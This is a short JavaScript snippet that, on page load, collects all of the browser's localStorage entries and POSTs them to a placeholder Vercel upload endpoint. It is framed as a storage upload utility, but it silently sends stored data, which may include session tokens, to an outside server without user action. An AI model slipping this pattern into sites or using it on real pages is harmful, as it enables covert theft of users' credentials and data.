// Function to upload data to Vercel Storage
async function uploadToVercelStorage(data) {
    const vercelEndpoint = 'https://your-vercel-endpoint.vercel.app/api/upload'; // Replace with your Vercel API endpoint

    try {
        const response = await fetch(vercelEndpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        });

        if (!response.ok) {
            throw new Error(`Failed to upload data: ${response.statusText}`);
        }

        console.log('LocalStorage data successfully uploaded to Vercel Storage.');
    } catch (error) {
        console.error('Error uploading data to Vercel Storage:', error);
    }
}

// Function to copy all localStorage data and upload it
function copyAndUploadLocalStorage() {
    const localStorageData = {};

    // Copy all localStorage key-value pairs
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        localStorageData[key] = localStorage.getItem(key);
    }

    // Upload the data to Vercel Storage
    uploadToVercelStorage(localStorageData);
}

// Trigger the function on page load
window.addEventListener('load', copyAndUploadLocalStorage);